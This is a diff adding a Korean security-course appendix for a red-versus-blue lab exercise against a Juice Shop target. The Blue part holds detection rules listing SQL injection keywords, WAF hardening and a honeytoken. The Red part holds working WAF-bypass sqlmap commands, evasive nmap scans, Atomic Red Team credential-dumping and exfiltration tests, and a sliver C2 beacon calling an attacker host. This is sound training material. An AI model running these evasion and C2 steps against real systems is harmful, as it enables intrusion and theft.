@@ -915,3 +915,173 @@ graph LR
 
 **학생 액션**: lab 1v1 exploit 시도 → MTTR 측정.
 
+
+---
+
+## 부록: 학습 OSS 도구 매트릭스 (Course11 — Week 12 공방전 R2 강화)
+
+### R1 회고 → R2 보강
+
+R1 (week11) 의 회고를 반영. Blue 가 새 룰 추가, Red 는 우회 강화.
+
+### Blue 강화
+
+```bash
+# === 1. R1 IoC → Sigma rule 자동 추가 ===
+cat > /opt/sigma/rules/r1-incidents.yml << 'EOF'
+title: SQLi via /rest/products/search (R1 IoC)
+status: experimental
+description: R1 round 에서 발견된 SQL injection 패턴
+references:
+  - https://internal/r1-report
+detection:
+  selection:
+    http.uri|contains: ["/rest/products/search?q="]
+    http.uri|contains: 
+      - "UNION SELECT"
+      - "OR 1=1"
+      - "SLEEP("
+      - "BENCHMARK("
+  condition: selection
+falsepositives:
+  - 자동 점검 도구 (whitelist 필요)
+level: high
+tags:
+  - attack.t1190
+  - attack.initial_access
+EOF
+
+# 자동 변환
+sigma convert -t suricata /opt/sigma/rules/r1-incidents.yml | \
+    sudo tee -a /etc/suricata/rules/r1.rules
+
+sigma convert -t opensearch /opt/sigma/rules/r1-incidents.yml > /tmp/r1-opensearch.json
+
+sudo systemctl reload suricata
+sudo /var/ossec/bin/wazuh-control restart
+
+# === 2. crowdsec 추가 scenario ===
+sudo cscli scenarios install \
+    crowdsecurity/sqli-attack \
+    crowdsecurity/xss-attack \
+    crowdsecurity/http-cve
+
+# 3. ModSec strict mode (paranoia 4)
+sudo tee /etc/modsecurity/strict.conf << 'EOF'
+SecAction "id:9001,phase:1,nolog,pass,t:none,setvar:tx.paranoia_level=4"
+SecAction "id:9002,phase:1,nolog,pass,t:none,setvar:tx.executing_paranoia_level=4"
+SecAction "id:9003,phase:1,nolog,pass,t:none,setvar:tx.crs_validate_utf8_encoding=1"
+SecAction "id:9004,phase:1,nolog,pass,t:none,setvar:tx.detection_paranoia_level=4"
+EOF
+sudo systemctl restart apache2
+
+# === 4. fail2ban 강화 ===
+sudo tee /etc/fail2ban/jail.d/strict.conf << 'EOF'
+[sshd]
+enabled = true
+maxretry = 3
+findtime = 300                                              # 5분
+bantime = 86400                                             # 24시간
+
+[apache-modsec]
+enabled = true
+filter = apache-modsec
+logpath = /var/log/apache2/modsec_audit.log
+maxretry = 3
+findtime = 60
+bantime = 3600
+EOF
+sudo systemctl restart fail2ban
+
+# === 5. R1 회고 — 새 honeytoken ===
+# 가짜 admin user 생성 (canary)
+echo "fake_admin@juice-sh.op:fakehash" >> /opt/canary/users.txt
+# 이 계정 사용 시도 → 즉시 alert (실제 사용자가 아님)
+
+sudo tee /var/ossec/etc/rules/canary.xml << 'EOF'
+<rule id="100700" level="15">
+  <if_matched_sid>5710</if_matched_sid>
+  <match>fake_admin@juice-sh.op</match>
+  <description>Honeytoken triggered — known malicious activity</description>
+</rule>
+EOF
+```
+
+### Red — 우회 강화
+
+```bash
+# === 1. sqlmap tamper (WAF 우회) ===
+sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=apple" \
+    --tamper=between,space2comment,charunicodeencode,equaltolike,modsecurityzeroversioned \
+    --random-agent \
+    --batch \
+    --level=5 --risk=3
+
+# 우회 효과:
+# - between: SPACE → /**/ 로 치환
+# - charunicodeencode: %u00xx 인코딩
+# - equaltolike: = → LIKE
+# - modsecurityzeroversioned: /*!12345 ... */ MySQL versioned comment
+
+# === 2. nmap 분할 + decoy + slow ===
+sudo nmap -sS -f --mtu 16 -D RND:10 -T1 \
+    --data-length 25 \
+    --source-port 53 \
+    -p 80,443 10.20.30.80
+
+# === 3. APT 시뮬 (Atomic Red Team — Kill Chain) ===
+sudo invoke run-atomic-test T1078         # Valid Accounts (R1 에서 admin 자격증명)
+sleep 60                                                   # Blue 탐지 시간
+sudo invoke run-atomic-test T1059.001     # PowerShell / bash
+sleep 60
+sudo invoke run-atomic-test T1547.001     # Boot or Logon Autostart
+sleep 60
+sudo invoke run-atomic-test T1003.001     # OS Credential Dumping
+sleep 60
+sudo invoke run-atomic-test T1041         # Exfil over C2
+
+# === 4. 이전 R1 IP 차단 우회 (proxy chain) ===
+# proxychains4 으로 다른 IP 사용
+proxychains4 sqlmap -u "http://target/?q=test" --batch
+
+# === 5. C2 — sliver mTLS (Suricata signature 우회) ===
+sliver-server
+> mtls --lhost attacker --lport 443 --cert custom.crt --key custom.key
+> generate beacon --mtls attacker:443 --evasion --save /tmp/beacon
+
+# 새 implant — 매번 다른 hash → AV/yara 우회
+```
+
+### R2 판정 — Blue 가 R1 IoC 차단했는가?
+
+```bash
+# Blue 측 검증
+# 1) R1 IoC (sqlmap UA) 차단 확인
+curl -A "sqlmap" http://10.20.30.80:3000/                  # → 403 expected
+
+# 2) 새 시그니처 동작 확인
+curl "http://10.20.30.80:3000/rest/products/search?q=' OR 1=1--"
+# Suricata 시그니처 매칭 확인:
+sudo jq 'select(.alert.signature | contains("R1"))' /var/log/suricata/eve.json
+
+# 3) crowdsec 차단 IP 목록
+sudo cscli decisions list
+
+# 4) ModSec strict — 우회 시도 차단율
+curl "http://10.20.30.80:3000/?q=%55%4e%49%4f%4e%20%53%45%4c%45%43%54"   # URL encoded
+# → 403 (CRS rule 942100 매칭)
+```
+
+### Red 우회 / Blue 강화 매트릭스
+
+| Red 우회 | R1 effective | R2 (Blue 강화 후) |
+|---------|--------------|-------------------|
+| sqlmap default | 60% 성공 | 5% (CRS strict 차단) |
+| sqlmap tamper | 80% | 30% (CRS paranoia 4) |
+| nmap default | 40% (Suricata 탐지) | 5% (R1 sigs) |
+| nmap evasion | 70% | 50% (frag rule 추가) |
+| brute (basic) | 25% (fail2ban) | 5% (frequency rule) |
+| Atomic T1078 | 100% (자격증명 알면) | 100% (canary 추가 시 50%) |
+| sliver mTLS | 95% | 80% (TLS fingerprint) |
+
+학생은 본 12주차 R2 에서 R1 회고 반영 + Blue 강화 (Sigma rule + ModSec paranoia 4 + canary) ↔ Red 우회 (sqlmap tamper + nmap evasion + Atomic Red Team + sliver) 의 강화 공방을 OSS 도구로 익힌다.
